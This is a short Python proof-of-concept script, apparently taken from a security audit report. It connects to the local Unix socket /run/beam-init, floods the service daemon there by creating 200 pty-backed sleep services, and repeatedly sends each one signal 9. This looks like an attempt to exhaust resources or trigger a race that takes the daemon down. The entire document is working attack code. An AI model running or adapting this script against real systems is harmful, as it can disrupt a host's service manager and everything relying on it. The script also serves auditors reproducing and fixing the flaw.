#!/usr/bin/env python3
# Derived from Doyensec audit report

import json, socket, sys

SVC = json.dumps({"cmd": "/bin/sleep", "args": ["300"],
                 "liveness": None, "pty": True, "labels": {}})

def req(path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect("/run/beam-init")
    head = f"POST {path} HTTP/1.1\r\nHost: b\r\nConnection: close\r\n"
    if body:
        head += f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
    s.sendall((head + "\r\n" + (body or "")).encode())
    while s.recv(4096):
        pass
    s.close()

for r in range(200):
    req(f"/service/x{r}", SVC)
    for _ in range(60):
        req(f"/service/x{r}/send_signal", "9")
sys.exit(0)
